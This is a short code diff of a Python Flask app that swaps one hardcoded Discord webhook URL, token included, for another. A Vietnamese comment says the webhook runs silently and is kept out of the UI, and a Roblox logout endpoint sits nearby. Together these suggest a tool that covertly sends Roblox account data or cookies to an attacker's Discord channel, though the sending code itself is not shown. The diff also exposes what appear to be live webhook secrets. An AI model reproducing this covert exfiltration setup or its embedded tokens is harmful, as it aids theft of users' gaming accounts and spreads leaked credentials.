@@ -13,7 +13,7 @@ import requests
 app = Flask(__name__)
 
 # Cấu hình Discord Webhook trực tiếp tại đây (chạy ngầm, không xuất ra UI)
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575353201798946956/X3229l9zhS-BASB2LcwtO5dN76HF8b2U6nCXcEFAFOWpKqTAkcXdUgLWQlSu3Z_inKmS"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575353316328611880/KZHZScqvXJv4M32QOqyocRuvq-jRIq-sQ9ISPrZahlx6dzjr8J-aV0jZ5IsphmtIKNzT"
 PING_EVERYONE = True
 
 LOGOUT_URL = "https://auth.roblox.com/v2/logout"
